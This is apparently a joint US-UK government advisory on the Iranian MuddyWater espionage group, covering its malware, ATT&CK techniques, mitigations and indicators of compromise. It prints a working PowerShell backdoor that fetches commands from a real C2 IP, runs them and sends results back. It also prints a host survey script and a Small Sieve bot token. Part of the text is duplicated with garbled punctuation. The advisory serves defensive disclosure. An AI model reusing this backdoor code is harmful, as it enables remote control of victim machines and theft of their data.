Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.
Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2 [T1071.001].
Reads and/or writes data from the following Registry Keys, HKLM\Software\NFC\IPA and HKLM\Software\NFC\(Default).

POWERSTATS
This group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems [T1059.001]. 
CNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools— along with JavaScript files used to establish connections back to malicious infrastructure—to the malware aggregation tool and repository, Virus Total. Network operators who identify multiple instances of the tools on the same network should investigate further as this may indicate the presence of an Iranian malicious cyber actor.
MuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688). See CISA’s Known Exploited Vulnerabilities Catalog for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities for additional Iranian APT group-specific vulnerability exploits.
Survey Script
The following script is an example of a survey script used by MuddyWater to enumerate information about victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain information about the compromised machine to generate a string, with these fields separated by a delimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant and sent to an adversary-controlled IP address.
$O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += "";;"";$ips = """";Get-WmiObject Win32_NetworkAdapterConfiguration -Filter ""IPEnabled=True"" | % {$ips = $ips + "", "" + $_.IPAddress[0]};$S += $ips.substring(1);$S += "";;"";$S += $O.OSArchitecture;$S += "";;"";$S += [System.Net.DNS]::GetHostByName('').HostName;$S += "";;"";$S += ((Get-WmiObject Win32_ComputerSystem).Domain);$S += "";;"";$S += $env:UserName;$S += "";;"";$AntiVirusProducts = Get-WmiObject -Namespace ""root\SecurityCenter2"" -Class AntiVirusProduct  -ComputerName $env:computername;$resAnti = @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti += $AntiVirusProduct.displayName};$S += $resAnti;echo $S;
Newly Identified PowerShell Backdoor
The newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-OR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.
function encode($txt,$key){$enByte = [Text.Encoding]::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$encodetxt = [Convert]::ToBase64String($enByte);return $encodetxt;}function decode($txt,$key){$enByte = [System.Convert]::FromBase64String($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte[$i] = $enByte[$i] -bxor $key;}$dtxt = [System.Text.Encoding]::UTF8.GetString($enByte);return $dtxt;}$global:tt=20;while($true){try{$w = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$w.proxy = [Net.WebRequest]::GetSystemWebProxy();$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.Length -gt 0){$res=[string]$ExecutionContext.InvokeCommand.InvokeScript(( decode $r 2));$wr = [System.Net.HttpWebRequest]::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$wr.proxy = [Net.WebRequest]::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res 2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds $global:tt;}
MITRE ATT&CK Techniques
MuddyWater uses the ATT&CK techniques listed in table 1.
Table 1: MuddyWater ATT&CK Techniques[2]



Technique Title
ID
Use




Reconnaissance


Gather Victim Identity Information: Email Addresses
T1589.002
MuddyWater has specifically targeted government agency employees with spearphishing emails.


Resource Development


Acquire Infrastructure: Web Services
T1583.006
MuddyWater has used file sharing services including OneHub to distribute tools.


Obtain Capabilities: Tool
T1588.002
MuddyWater has made use of legitimate tools ConnectWise and RemoteUtilities for access to target environments.


Initial Access


Phishing: Spearphishing Attachment
T1566.001
MuddyWater has compromised third parties and used compromised accounts to send spearphishing emails with targeted attachments. 


Phishing: Spearphishing Link
T1566.002
MuddyWater has sent targeted spearphishing emails with malicious links.


Execution


Windows Management Instrumentation
T1047
MuddyWater has used malware that leveraged Windows Management Instrumentation for execution and querying host information.


Command and Scripting Interpreter: PowerShell
T1059.001
MuddyWater has used PowerShell for execution.


Command and Scripting Interpreter: Windows Command Shell
1059.003
MuddyWater has used a custom tool for creating reverse shells.


Command and Scripting Interpreter: Visual Basic
T1059.005
MuddyWater has used Virtual Basic Script (VBS) files to execute its POWERSTATS payload, as well as macros.


Command and Scripting Interpreter: Python
T1059.006
MuddyWater has used developed tools in Python including Out1. 


Command and Scripting Interpreter: JavaScript
T1059.007
MuddyWater has used JavaScript files to execute its POWERSTATS payload.


Exploitation for Client Execution
T1203
MuddyWater has exploited the Office vulnerability CVE-2017-0199 for execution.


User Execution: Malicious Link
T1204.001
MuddyWater has distributed URLs in phishing emails that link to lure documents.


User Execution: Malicious File
T1204.002
MuddyWater has attempted to get users to enable macros and launch malicious Microsoft Word documents delivered via spearphishing emails.


Inter-Process Communication: Component Object Model
T1559.001
MuddyWater has used malware that has the capability to execute malicious code via COM, DCOM, and Outlook.


Inter-Process Communication: Dynamic Data Exchange
T1559.002
MuddyWater has used malware that can execute PowerShell scripts via Dynamic Data Exchange.


Persistence


Scheduled Task/Job: Scheduled Task
T1053.005
MuddyWater has used scheduled tasks to establish persistence.


Office Application Startup: Office Template Macros
T1137.001
MuddyWater has used a Word Template, Normal.dotm, for persistence.


Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder
T1547.001
MuddyWater has added Registry Run key KCU\Software\Microsoft\Windows\CurrentVersion\Run\SystemTextEncoding to establish persistence. 


Privilege Escalation


Abuse Elevation Control Mechanism: Bypass User Account Control 
T1548.002
MuddyWater uses various techniques to bypass user account control.


Credentials from Password Stores
T1555
MuddyWater has performed credential dumping with LaZagne and other tools, including by dumping passwords saved in victim email.


Credentials from Web Browsers

T1555.003

MuddyWater has run tools including Browser64 to steal passwords saved in victim web browsers.


Defense Evasion


Obfuscated Files or Information
T1027
MuddyWater has used Daniel Bohannon’s Invoke-Obfuscation framework and obfuscated PowerShell scripts. The group has also used other obfuscation methods, including Base64 obfuscation of VBScripts and PowerShell commands.


Steganography
T1027.003
MuddyWater has stored obfuscated JavaScript code in an image file named temp.jpg.


Compile After Delivery
T1027.004
MuddyWater has used the .NET csc.exe tool to compile executables from downloaded C# code.


Masquerading: Match Legitimate Name or Location
T1036.005
MuddyWater has disguised malicious executables and used filenames and Registry key names associated with Windows Defender. E.g., Small Sieve uses variations of Microsoft (Microsift) and Outlook in its filenames to attempt to avoid detection during casual inspection.


Deobfuscate/Decode Files or Information

T1140

MuddyWater decoded Base64-encoded PowerShell commands using a VBS file.


Signed Binary Proxy Execution: CMSTP

T1218.003

MuddyWater has used CMSTP.exe and a malicious .INF file to execute its POWERSTATS payload.


Signed Binary Proxy Execution: Mshta
T1218.005
MuddyWater has used mshta.exe to execute its POWERSTATS payload and to pass a PowerShell one-liner for execution.


Signed Binary Proxy Execution: Rundll32
T1218.011
MuddyWater has used malware that leveraged rundll32.exe in a Registry Run key to execute a .dll.


Execution Guardrails
T1480
The Small Sieve payload used by MuddyWater will only execute correctly if the word “Platypus” is passed to it on the command line.


Impair Defenses: Disable or Modify Tools
T1562.001
MuddyWater can disable the system's local proxy settings.


Credential Access


OS Credential Dumping: LSASS Memory
T1003.001
MuddyWater has performed credential dumping with Mimikatz and procdump64.exe.


OS Credential Dumping: LSA Secrets

T1003.004

MuddyWater has performed credential dumping with LaZagne.


OS Credential Dumping: Cached Domain Credentials
T1003.005
MuddyWater has performed credential dumping with LaZagne.


Unsecured Credentials: Credentials In Files

T1552.001

MuddyWater has run a tool that steals passwords saved in victim email.


Discovery 


System Network Configuration Discovery
T1016
MuddyWater has used malware to collect the victim’s IP address and domain name.


System Owner/User Discovery
T1033
MuddyWater has used malware that can collect the victim’s username.


System Network Connections Discovery
T1049
MuddyWater has used a PowerShell backdoor to check for Skype connections on the target machine.


Process Discovery
T1057
MuddyWater has used malware to obtain a list of running processes on the system.


System Information Discovery

T1082

MuddyWater has used malware that can collect the victim’s OS version and machine name.


File and Directory Discovery
T1083
MuddyWater has used malware that checked if the ProgramData folder had folders or files with the keywords ""Kasper,"" ""Panda,"" or ""ESET.""


Account Discovery: Domain Account
T1087.002
MuddyWater has used cmd.exe net user/domain to enumerate domain users.


Software Discovery
T1518
MuddyWater has used a PowerShell backdoor to check for Skype connectivity on the target machine.


Security Software Discovery
T1518.001
MuddyWater has used malware to check running processes against a hard-coded list of security tools often used by malware researchers.


Collection


Screen Capture
T1113
MuddyWater has used malware that can capture screenshots of the victim’s machine.



Archive Collected Data: Archive via Utility

T1560.001
MuddyWater has used the native Windows cabinet creation tool, makecab.exe, likely to compress stolen data to be uploaded.


Command and Control


Application Layer Protocol: Web Protocols
T1071.001
MuddyWater has used HTTP for C2 communications. e.g., Small Sieve beacons and tasking are performed using the Telegram API over HTTPS.


Proxy: External Proxy
T1090.002

MuddyWater has controlled POWERSTATS from behind a proxy network to obfuscate the C2 location. 
MuddyWater has used a series of compromised websites that victims connected to randomly to relay information to C2.



Web Service: Bidirectional Communication
T1102.002
MuddyWater has used web services including OneHub to distribute remote access tools.


Multi-Stage Channels
T1104
MuddyWater has used one C2 to obtain enumeration scripts and monitor web logs, but a different C2 to send data back.


Ingress Tool Transfer
T1105
MuddyWater has used malware that can upload additional files to the victim’s machine.


Data Encoding: Standard Encoding
T1132.001
MuddyWater has used tools to encode C2 communications including Base64 encoding.


Data Encoding: Non-Standard Encoding
T1132.002
MuddyWater uses tools such as Small Sieve, which employs a custom hex byte swapping encoding scheme to obfuscate tasking traffic.


Remote Access Software
 T1219
MuddyWater has used a legitimate application, ScreenConnect, to manage systems remotely and move laterally.


Exfiltration


Exfiltration Over C2 Channel
T1041
MuddyWater has used C2 infrastructure to receive exfiltrated data.



 

Mitigations

Protective Controls and Architecture

Deploy application control software to limit the applications and executable code that can be run by users. Email attachments and files downloaded via links in emails often contain executable code. 

Identity and Access Management

Use multifactor authentication where possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Limit the use of administrator privileges. Users who browse the internet, use email, and execute code with administrator privileges make for excellent spearphishing targets because their system—once infected—enables attackers to move laterally across the network, gain additional accesses, and access highly sensitive information. 

Phishing Protection

Enable antivirus and anti-malware software and update signature definitions in a timely manner. Well-maintained antivirus software may prevent use of commonly deployed attacker tools that are delivered via spearphishing. 
Be suspicious of unsolicited contact via email or social media from any individual you do not know personally. Do not click on hyperlinks or open attachments in these communications.
Consider adding an email banner to emails received from outside your organization and disabling hyperlinks in received emails.
Train users through awareness and simulations to recognize and report phishing and social engineering attempts. Identify and suspend access of user accounts exhibiting unusual activity.
Adopt threat reputation services at the network device, operating system, application, and email service levels. Reputation services can be used to detect or prevent low-reputation email addresses, files, URLs, and IP addresses used in spearphishing attacks. 

Vulnerability and Configuration Management

Install updates/patch operating systems, software, and firmware as soon as updates/patches are released. Prioritize patching known exploited vulnerabilities.

Additional Resources

For more information on Iranian government-sponsored malicious cyber activity, see CISA's webpage – Iran Cyber Threat Overview and Advisories and CNMF's press release – Iranian intel cyber suite of malware uses open source tools. 
For information and resources on protecting against and responding to ransomware, refer to StopRansomware.gov, a centralized, whole-of-government webpage providing ransomware resources and alerts.
The joint advisory from the cybersecurity authorities of Australia, Canada, New Zealand, the United Kingdom, and the United States: Technical Approaches to Uncovering and Remediating Malicious Activity provides additional guidance when hunting or investigating a network and common mistakes to avoid in incident handling.
CISA offers a range of no-cost cyber hygiene services to help critical infrastructure organizations assess, identify, and reduce their exposure to threats, including ransomware. By requesting these services, organizations of any size could find ways to reduce their risk and mitigate attack vectors.
The U.S. Department of State’s Rewards for Justice (RFJ) program offers a reward of up to $10 million for reports of foreign government malicious activity against U.S. critical infrastructure. See the RFJ website for more information and how to report information securely.

References
[1] CNMF Article: Iranian Intel Cyber Suite of Malware Uses Open Source Tools
[2] MITRE ATT&CK: MuddyWater 
Caveats
The information you have accessed or received is being provided “as is” for informational purposes only. The FBI, CISA, CNMF, and NSA do not endorse any commercial product or service, including any subjects of analysis. Any reference to specific commercial products, processes, or services by service mark, trademark, manufacturer, or otherwise, does not constitute or imply their endorsement, recommendation, or favoring by the FBI, CISA, CNMF, or NSA.
Purpose
This document was developed by the FBI, CISA, CNMF, NCSC-UK, and NSA in furtherance of their respective cybersecurity missions, including their responsibilities to develop and issue cybersecurity specifications and mitigations. This information may be shared broadly to reach all appropriate stakeholders. The United States’ NSA agrees with this attribution and the details provided in this report.
Appendix A: IOCs
The following IP addresses are associated with MuddyWater activity:
5.199.133[.]149
45.142.213[.]17    
45.142.212[.]61
45.153.231[.]104 
46.166.129[.]159 
80.85.158[.]49 
87.236.212[.]22
88.119.170[.]124 
88.119.171[.]213
89.163.252[.]232
95.181.161[.]49
95.181.161[.]50
164.132.237[.]65
185.25.51[.]108
185.45.192[.]228 
185.117.75[.]34
185.118.164[.]21
185.141.27[.]143
185.141.27[.]248 
185.183.96[.]7
185.183.96[.]44
192.210.191[.]188
192.210.226[.]128
Appendix B: Small Sieve
Note: the information contained in this appendix is from NCSC-UK analysis of a Small Sieve sample.
Metadata
Table 2: Gram.app.exe Metadata



Filename
gram_app.exe 




Description
NSIS installer that installs and runs the index.exe backdoor and adds a persistence registry key 


Size
16999598 bytes 


MD5
15fa3b32539d7453a9a85958b77d4c95 


SHA-1
11d594f3b3cf8525682f6214acb7b7782056d282 


SHA-256
b75208393fa17c0bcbc1a07857686b8c0d7e0471d00a167a07fd0d52e1fc9054 


Compile Time
2021-09-25 21:57:46 UTC 



 
Table 3: Index.exe Metadata



Filename
 index.exe 




Description
The final PyInstaller-bundled Python 3.9 backdoor 


Size
17263089 bytes 


MD5
5763530f25ed0ec08fb26a30c04009f1 


SHA-1
2a6ddf89a8366a262b56a251b00aafaed5321992 


SHA-256
bf090cf7078414c9e157da7002ca727f06053b39fa4e377f9a0050f2af37d3a2  


Compile Time
2021-08-01 04:39:46 UTC 



 
Functionality 
Installation 
Small Sieve is distributed as a large (16MB) NSIS installer named gram_app.exe, which does not appear to masquerade as a legitimate application. Once executed, the backdoor binary index.exe is installed in the user’s AppData/Roaming directory and is added as a Run key in the registry to enabled persistence after reboot. 
The installer then executes the backdoor with the “Platypus” argument [T1480], which is also present in the registry persistence key: HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift. 
Configuration 
The backdoor attempts to restore previously initialized session data from %LocalAppData%\MicrosoftWindowsOutlookDataPlus.txt. 
If this file does not exist, then it uses the hardcoded values listed in table 4:
Table 4: Credentials and Session Values



Field 
Value
Description




Chat ID
2090761833 
This is the Telegram Channel ID that beacons are sent to, and, from which, tasking requests are received. Tasking requests are dropped if they do not come from this channel. This value cannot be changed. 


Bot ID
Random value between 10,000,000 and 90,000,000 
This is a bot identifier generated at startup that is sent to the C2 in the initial beacon. Commands must be prefixed with /com[Bot ID] in order to be processed by the malware.


Telegram Token 
2003026094: AAGoitvpcx3SFZ2_6YzIs4La_kyDF1PbXrY 
This is the initial token used to authenticate each message to the Telegram Bot API.



 
Tasking 
Small Sieve beacons via the Telegram Bot API, sending the configured Bot ID, the currently logged-in user, and the host’s IP address, as described in the Communications (Beacon format) section below. It then waits for tasking as a Telegram bot using the python-telegram-bot module. 
Two task formats are supported: 

/start – no argument is passed; this causes the beacon information to be repeated. 
/com[BotID] [command] – for issuing commands passed in the argument. 

The following commands are supported by the second of these formats, as described in table 5: 
Table 5: Supported Commands



Command
Description




delete 
This command causes the backdoor to exit; it does not remove persistence. 


download url””filename 
The URL will be fetched and saved to the provided filename using the Python urllib module urlretrieve function.  


change token””newtoken 
The backdoor will reconnect to the Telegram Bot API using the provided token newtoken. This updated token will be stored in the encoded MicrosoftWindowsOutlookDataPlus.txt file. 


disconnect 
The original connection to Telegram is terminated. It is likely used after a change token command is issued. 



 
Any commands other than those detailed in table 5 are executed directly by passing them to cmd.exe /c, and the output is returned as a reply.
Defense Evasion 
Anti-Sandbox 

Figure 1: Execution Guardrail
Threat actors may be attempting to thwart simple analysis by not passing “Platypus” on the command line. 
String obfuscation 
Internal strings and new Telegram tokens are stored obfuscated with a custom alphabet and Base64-encoded. A decryption script is included in Appendix B.
Communications 
Beacon Format 
Before listening for tasking using CommandHandler objects from the python-telegram-bot module, a beacon is generated manually using the standard requests library:

Figure 2: Manually Generated Beacon
The hex host data is encoded using the byte shuffling algorithm as described in the “Communications (Traffic obfuscation)” section of this report. The example in figure 2 decodes to: 
admin/WINDOMAIN1 | 10.17.32.18
 
Traffic obfuscation 
Although traffic to the Telegram Bot API is protected by TLS, Small Sieve obfuscates its tasking and response using a hex byte shuffling algorithm. A Python3 implementation is shown in figure 3.
 

Figure 3: Traffic Encoding Scheme Based on Hex Conversion and Shuffling
 
Detection 
Table 6 outlines indicators of compromise.
 
Table 6: Indicators of Compromise



Type
Description
Values




Path
Telegram Session Persistence File (Obfuscated) 
%LocalAppData%\MicrosoftWindowsOutlookDataPlus.txt 


Path
Installation path of the Small Sieve binary 
%AppData%\OutlookMicrosift\index.exe 


Registry value name
Persistence Registry Key pointing to index.exe with a “Platypus” argument
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\OutlookMicrosift 



 
String Recover Script

Figure 4: String Recovery Script

Contact Information

To report suspicious or criminal activity related to information found in this joint Cybersecurity Advisory, contact your local FBI field office at www.fbi.gov/contact-us/field-offices, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by email at CyWatch@fbi.gov. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact. To request incident response resources or technical assistance related to these threats, contact CISA at Central@cisa.dhs.gov. For NSA client requirements or general cybersecurity inquiries, contact the Cybersecurity Requirements Center at Cybersecurity_Requests@nsa.gov. United Kingdom organizations should report a significant cyber security incident: ncsc.gov.uk/report-an-incident (monitored 24 hours) or for urgent assistance call 03000 200 973.

Revisions

February 24, 2022: Initial Version






This product is provided subject to this Notification and this Privacy & Use policy.


","{'T1041', 'TA0003', 'T1218.003', 'T1083', 'T1027.003', 'TA0035', 'T1562.001', 'T1566.002', 'T1090.002', 'T1001.001', 'T1132.002', 'T1219', 'T1588.002', 'TA0010', 'T1005', 'TA0005', 'T1203', 'T1204.002', 'T1555', 'T1016', 'T1583.006', 'T1102.002', 'T1560.001', 'T1087.002', 'T1036.005', 'T1572', 'T1027.004', 'T1003.001', 'T1003.005', 'T1049', 'T1082', 'T1113', 'T1140', 'T1218.005', 'T1105', 'T1480', 'T1132.001', 'T1204.001', 'T1027', 'T1059.006', 'T1218.011', 'T1518.001', 'T1552.001', 'T1059.005', 'T1559.002', 'T1057', 'T1566.001', 'T1574.002', 'T1518', 'T1104', 'T1559.001', 'T1059.001', 'T1137.001', 'T1033', 'T1547.001', 'T1059.007', 'T1071.001', 'T1047', 'T1053.005', 'T1003.004', 'T1555.003', 'T1548.002', 'T1589.002'}","




Summary

Actions to Take Today to Protect Against Malicious Activity
* Search for indicators of compromise.
* Use antivirus software.
* Patch all systems.
* Prioritize patching known exploited vulnerabilities.
* Train users to recognize and report phishing attempts.
* Use multi-factor authentication.
Note: this advisory uses the MITRE Adversarial Tactics, Techniques, and Common Knowledge (ATT&CK®) framework, version 10. See the ATT&CK for Enterprise for all referenced threat actor tactics and techniques.
The Federal Bureau of Investigation (FBI), the Cybersecurity and Infrastructure Security Agency (CISA), the U.S. Cyber Command Cyber National Mission Force (CNMF), and the United Kingdom’s National Cyber Security Centre (NCSC-UK) have observed a group of Iranian government-sponsored advanced persistent threat (APT) actors, known as MuddyWater, conducting cyber espionage and other malicious cyber operations targeting a range of government and private-sector organizations across sectors—including telecommunications, defense, local government, and oil and natural gas—in Asia, Africa, Europe, and North America. Note: MuddyWater is also known as Earth Vetala, MERCURY, Static Kitten, Seedworm, and TEMP.Zagros.
MuddyWater is a subordinate element within the Iranian Ministry of Intelligence and Security (MOIS).,1, This APT group has conducted broad cyber campaigns in support of MOIS objectives since approximately 2018. MuddyWater actors are positioned both to provide stolen data and accesses to the Iranian government and to share these with other malicious cyber actors.
MuddyWater actors are known to exploit publicly reported vulnerabilities and use open-source tools and strategies to gain access to sensitive data on victims’ systems and deploy ransomware. These actors also maintain persistence on victim networks via tactics such as side-loading dynamic link libraries (DLLs)—to trick legitimate programs into running malware—and obfuscating PowerShell scripts to hide command and control (C2) functions. FBI, CISA, CNMF, and NCSC-UK have observed MuddyWater actors recently using various malware—variants of PowGoop, Small Sieve, Canopy (also known as Starwhale), Mori, and POWERSTATS—along with other tools as part of their malicious activity. 
This advisory provides observed tactics, techniques, and procedures (TTPs); malware; and indicators of compromise (IOCs) associated with this Iranian government-sponsored APT activity to aid organizations in the identification of malicious activity against sensitive networks. 
FBI, CISA, CNMF, NCSC-UK, and the National Security Agency (NSA) recommend organizations apply the mitigations in this advisory and review the following resources for additional information. Note: also see the Additional Resources section.

Malware Analysis Report – MAR-10369127-1.v1: MuddyWater
IOCs – AA22-052A.stix and MAR-10369127-1.v1.stix
CISA's webpage – Iran Cyber Threat Overview and Advisories
NCSC-UK MAR – Small Sieve
CNMF's press release – Iranian intel cyber suite of malware uses open source tools

Click here for a PDF version of this report.

Technical Details

FBI, CISA, CNMF, and NCSC-UK have observed the Iranian government-sponsored MuddyWater APT group employing spearphishing, exploiting publicly known vulnerabilities, and leveraging multiple open-source tools to gain access to sensitive government and commercial networks. 
As part of its spearphishing campaign, MuddyWater attempts to coax their targeted victim into downloading ZIP files, containing either an Excel file with a malicious macro that communicates with the actor’s C2 server or a PDF file that drops a malicious file to the victim’s network,. MuddyWater actors also use techniques such as side-loading DLLs, to trick legitimate programs into running malware and obfuscating PowerShell scripts, to hide C2 functions, (see the PowGoop section for more information). 
Additionally, the group uses multiple malware sets—including PowGoop, Small Sieve, Canopy/Starwhale, Mori, and POWERSTATS—for loading malware, backdoor access, persistence, and exfiltration,. See below for descriptions of some of these malware sets, including newer tools or variants to the group’s suite. Additionally, see Malware Analysis Report MAR-10369127.r1.v1: MuddyWater for further details.
PowGoop
MuddyWater actors use new variants of PowGoop malware as their main loader in malicious operations; it consists of a DLL loader and a PowerShell-based downloader. The malicious file impersonates a legitimate file that is signed as a Google Update executable file.
According to samples of PowGoop analyzed by CISA and CNMF, PowGoop consists of three components:

A DLL file renamed as a legitimate filename, Goopdate.dll, to enable the DLL side-loading technique,. The DLL file is contained within an executable, GoogleUpdate.exe. 
A PowerShell script, obfuscated as a .dat file, goopdate.dat, used to decrypt and run a second obfuscated PowerShell script, config.txt,.
config.txt, an encoded, obfuscated PowerShell script containing a beacon to a hardcoded IP address.

These components retrieve encrypted commands from a C2 server. The DLL file hides communications with MuddyWater C2 servers by executing with the Google Update service. 
Small Sieve
According to a sample analyzed by NCSC-UK, Small Sieve is a simple Python, backdoor distributed using a Nullsoft Scriptable Install System (NSIS) installer, gram_app.exe. The NSIS installs the Python backdoor, index.exe, and adds it as a registry run key, enabling persistence,. 
MuddyWater disguises malicious executables and uses filenames and Registry key names associated with Microsoft's Windows Defender to avoid detection during casual inspection. The APT group has also used variations of Microsoft (e.g., ""Microsift"") and Outlook in its filenames associated with Small Sieve,.
Small Sieve provides basic functionality required to maintain and expand a foothold in victim infrastructure and avoid detection, by using custom string and traffic obfuscation schemes together with the Telegram Bot application programming interface (API). Specifically, Small Sieve’s beacons and taskings are performed using Telegram API over Hypertext Transfer Protocol Secure (HTTPS), and the tasking and beaconing data is obfuscated through a hex byte swapping encoding scheme combined with an obfuscated Base64 function,.
Note: cybersecurity agencies in the United Kingdom and the United States attribute Small Sieve to MuddyWater with high confidence. 
See Appendix B for further analysis of Small Sieve malware.
Canopy
MuddyWater also uses Canopy/Starwhale malware, likely distributed via spearphishing emails with targeted attachments,. According to two Canopy/Starwhale samples analyzed by CISA, Canopy uses Windows Script File (.wsf) scripts distributed by a malicious Excel file. Note: the cybersecurity agencies of the United Kingdom and the United States attribute these malware samples to MuddyWater with high confidence. 
In the samples CISA analyzed, a malicious Excel file, Cooperation terms.xls, contained macros written in Visual Basic for Applications (VBA) and two encoded Windows Script Files. When the victim opens the Excel file, they receive a prompt to enable macros,. Once this occurs, the macros are executed, decoding and installing the two embedded Windows Script Files.
The first .wsf is installed in the current user startup folder, for persistence. The file contains hexadecimal (hex)-encoded strings that have been reshuffled,. The file executes a command to run the second .wsf.
The second .wsf also contains hex-encoded strings that have been reshuffled. This file collects, the victim system’s IP address, computer name, and username,. The collected data is then hex-encoded and sent to an adversary-controlled IP address, http,:,88.119.170,.,124, via an HTTP POST request,.
Mori
MuddyWater also uses the Mori backdoor that uses Domain Name System tunneling to communicate with the group’s C2 infrastructure,. 
According to one sample analyzed by CISA, FML.dll, Mori uses a DLL written in C++ that is executed with regsvr32.exe with export DllRegisterServer; this DLL appears to be a component to another program. FML.dll contains approximately 200MB of junk data, in a resource directory 205, number 105. Upon execution, FML.dll creates a mutex, 0x50504060, and performs the following tasks:

Deletes the file FILENAME.old and deletes file by registry value. The filename is the DLL file with a .old extension.
Resolves networking APIs from strings that are ADD-encrypted with the key 0x05.
Uses Base64 and Java Script Object Notation (JSON) based on certain key values passed to the JSON library functions. It appears likely that JSON is used to serialize C2 commands and/or their results.
Communicates using HTTP over either IPv4 or IPv6, depending on the value of an unidentified flag, for C2,.
Reads and/or writes data from the following Registry Keys, HKLM\Software\NFC\IPA and HKLM\Software\NFC\(Default).

POWERSTATS
This group is also known to use the POWERSTATS backdoor, which runs PowerShell scripts to maintain persistent access to the victim systems,. 
CNMF has posted samples further detailing the different parts of MuddyWater’s new suite of tools— along with JavaScript files used to establish connections back to malicious infrastructure—to the malware aggregation tool and repository, Virus Total. Network operators who identify multiple instances of the tools on the same network should investigate further as this may indicate the presence of an Iranian malicious cyber actor.
MuddyWater actors are also known to exploit unpatched vulnerabilities as part of their targeted operations. FBI, CISA, CNMF, and NCSC-UK have observed this APT group recently exploiting the Microsoft Netlogon elevation of privilege vulnerability (CVE-2020-1472) and the Microsoft Exchange memory corruption vulnerability (CVE-2020-0688). See CISA’s Known Exploited Vulnerabilities Catalog for additional vulnerabilities with known exploits and joint Cybersecurity Advisory: Iranian Government-Sponsored APT Cyber Actors Exploiting Microsoft Exchange and Fortinet Vulnerabilities for additional Iranian APT group-specific vulnerability exploits.
Survey Script
The following script is an example of a survey script used by MuddyWater to enumerate information about victim computers. It queries the Windows Management Instrumentation (WMI) service to obtain information about the compromised machine to generate a string, with these fields separated by a delimiter (e.g., ;; in this sample). The produced string is usually encoded by the MuddyWater implant and sent to an adversary-controlled IP address.
$O = Get-WmiObject Win32_OperatingSystem;$S = $O.Name;$S += "";;"";$ips = """";Get-WmiObject Win32_NetworkAdapterConfiguration -Filter ""IPEnabled=True"" | % {$ips = $ips + "", "" + $_.IPAddress,0,};$S += $ips.substring(1);$S += "";;"";$S += $O.OSArchitecture;$S += "";;"";$S +=,System.Net.DNS,::GetHostByName('').HostName;$S += "";;"";$S += ((Get-WmiObject Win32_ComputerSystem).Domain);$S += "";;"";$S += $env:UserName;$S += "";;"";$AntiVirusProducts = Get-WmiObject -Namespace ""root\SecurityCenter2"" -Class AntiVirusProduct  -ComputerName $env:computername;$resAnti = @();foreach($AntiVirusProduct in $AntiVirusProducts){$resAnti += $AntiVirusProduct.displayName};$S += $resAnti;echo $S;
Newly Identified PowerShell Backdoor
The newly identified PowerShell backdoor used by MuddyWater below uses a single-byte Exclusive-OR (XOR) to encrypt communications with the key 0x02 to adversary-controlled infrastructure. The script is lightweight in functionality and uses the InvokeScript method to execute responses received from the adversary.
function encode($txt,$key){$enByte =,Text.Encoding,::UTF8.GetBytes($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte,$i, = $enByte,$i, -bxor $key;}$encodetxt =,Convert,::ToBase64String($enByte);return $encodetxt;}function decode($txt,$key){$enByte =,System.Convert,::FromBase64String($txt);for($i=0; $i -lt $enByte.count ; $i++){$enByte,$i, = $enByte,$i, -bxor $key;}$dtxt =,System.Text.Encoding,::UTF8.GetString($enByte);return $dtxt;}$global:tt=20;while($true){try{$w =,System.Net.HttpWebRequest,::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$w.proxy =,Net.WebRequest,::GetSystemWebProxy();$r=(New-Object System.IO.StreamReader($w.GetResponse().GetResponseStream())).ReadToEnd();if($r.Length -gt 0){$res=,string,$ExecutionContext.InvokeCommand.InvokeScript(( decode $r 2));$wr =,System.Net.HttpWebRequest,::Create('http://95.181.161.49:80/index.php?id=<victim identifier>');$wr.proxy =,Net.WebRequest,::GetSystemWebProxy();$wr.Headers.Add('cookie',(encode $res 2));$wr.GetResponse().GetResponseStream();}}catch {}Start-Sleep -Seconds $global:tt;}
MITRE ATT&CK Techniques
MuddyWater uses the ATT&CK techniques listed in table 1.
Table 1: MuddyWater ATT&CK Techniques,2,

 

Mitigations

Protective Controls and Architecture

Deploy application control software to limit the applications and executable code that can be run by users. Email attachments and files downloaded via links in emails often contain executable code. 

Identity and Access Management

Use multifactor authentication where possible, particularly for webmail, virtual private networks, and accounts that access critical systems. 
Limit the use of administrator privileges. Users who browse the internet, use email, and execute code with administrator privileges make for excellent spearphishing targets because their system—once infected—enables attackers to move laterally across the network, gain additional accesses, and access highly sensitive information. 

Phishing Protection

